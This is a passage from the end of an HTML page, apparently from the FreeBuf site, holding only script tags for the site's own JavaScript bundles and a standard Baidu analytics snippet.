src="https://www.freebuf.com/freebuf/2.1.0.f2bddb9b2047fee49046.js" defer></script><script src="https://www.freebuf.com/freebuf/2.1.0.9b4235960ae0c2cc9600.js" defer></script><script src="https://www.freebuf.com/freebuf/2.1.0.32658a830f395d50ed89.js" defer></script><script src="https://www.freebuf.com/freebuf/2.1.0.a53ea8b00779fcef0fe8.js" defer></script><script src="https://www.freebuf.com/freebuf/2.1.0.e258e4cfb199b83189c6.js" defer></script><script src="https://www.freebuf.com/freebuf/2.1.0.927944ae29787a1b414f.js" defer></script><script src="https://www.freebuf.com/freebuf/2.1.0.02cf93cfce14e2557064.js" defer></script><script src="https://www.freebuf.com/freebuf/2.1.0.d38dc245ca9b7dd8571d.js" defer></script><script src="https://www.freebuf.com/freebuf/2.1.0.2ce4e8f001d4b2b67fbb.js" defer></script><script src="https://www.freebuf.com/freebuf/2.1.0.627b1661cc29c3e32429.js" defer></script>
</body>
<script>var _hmt=_hmt||[];_hmt.push(["_setAccount","cc53db168808048541c6735ce30421f5"]),function(){var c=document.createElement("script");c.src="https://hm.baidu.com/hm.js?cc53db168808048541c6735ce30421f5";var e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(c,e)}()</script>
</html>
